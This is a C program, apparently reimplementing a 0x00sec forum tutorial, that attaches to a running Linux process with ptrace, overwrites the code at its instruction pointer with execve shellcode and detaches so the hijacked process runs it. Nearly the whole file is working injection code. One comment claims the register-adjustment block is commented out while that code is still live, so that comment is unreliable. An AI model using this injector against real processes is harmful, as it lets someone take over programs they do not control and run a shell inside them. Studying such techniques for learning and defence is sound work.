// https://0x00sec.org/t/linux-infecting-running-processes/1097

#include <stdio.h>

#include <stdlib.h>

#include <string.h>

#include <stdint.h>


#include <sys/ptrace.h>

#include <sys/types.h>

#include <sys/wait.h>

#include <unistd.h>

#include <sys/user.h>

#include <sys/reg.h>

#define SHELLCODE_SIZE 24

unsigned char * shellcode =
"\x48\x31\xd2\x48\x31\xf6\x48\x8d\x3c\x25\x23\x01\x60\x00\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05";

int inject_data(pid_t pid, unsigned char * src, void * dst, int len) {
  int i;
  uint32_t * s = (uint32_t * ) src;
  uint32_t * d = (uint32_t * ) dst;
  // insert shellcode in increments of 4 bytes as one word is 4 bytes and PTRACE_POKETEXT copies one word at a time according to man page
  for (i = 0; i < len; i += 4, s++, d++) {
    if ((ptrace(PTRACE_POKETEXT, pid, d, * s)) < 0) {
      perror("ptrace(POKETEXT):");
      return -1;
    }
  }
  return 0;
}

int main(int argc, char * argv[]) {
  pid_t target;
  struct user_regs_struct regs;
  int syscall;
  long dst;

  if (argc != 2) {
    fprintf(stderr, "Usage:\n\t%s pid\n", argv[0]);
    exit(1);
  }

  // get PID of target process
  target = atoi(argv[1]);
  printf("+ Tracing process %d\n", target);

  // attack to target process
  if ((ptrace(PTRACE_ATTACH, target, NULL, NULL)) < 0) {
    perror("ptrace(ATTACH):");
    exit(1);
  }

  // wait for the SIGTRAP signal which would mean that the process has been attached to
  printf("+ Waiting for process...\n");
  wait(NULL);

  // get registers of target process
  printf("+ Getting Registers\n");
  if ((ptrace(PTRACE_GETREGS, target, NULL, & regs)) < 0) {
    perror("ptrace(GETREGS):");
    exit(1);
  }

  // inject code into instruction pointer's current position

  printf("+ Injecting shell code at %p\n", (void * ) regs.rip);
  inject_data(target, shellcode, (void * ) regs.rip, SHELLCODE_SIZE);

  /*
    In 0x00pf's forum post, they state that PTRACE_DETACH subtracts two bytes from the instruction pointer and results in a
    segmentation fault when trying to run this exploit. This was corroborated on other online forums. To compensate for this, 
    they added two bytes to regs.rip which required them to call PTRACE_SETREGS as they modified a register. I did not face
    the same issue on my machine and there was nothing about this on the PTRACE_DETACH description on the ptrace `man` page.
    So, I commented out the following code.
  */

  regs.rip += 2;
  printf("+ Setting instruction pointer to %p\n", (void * ) regs.rip);

  if ((ptrace(PTRACE_SETREGS, target, NULL, & regs)) < 0) {
    perror("ptrace(GETREGS):");
    exit(1);
  }
  printf("+ Run it!\n");

  // return execution control back to target process and have it run
  if ((ptrace(PTRACE_DETACH, target, NULL, NULL)) < 0) {
    perror("ptrace(DETACH):");
    exit(1);
  }
  
  return 0;
}
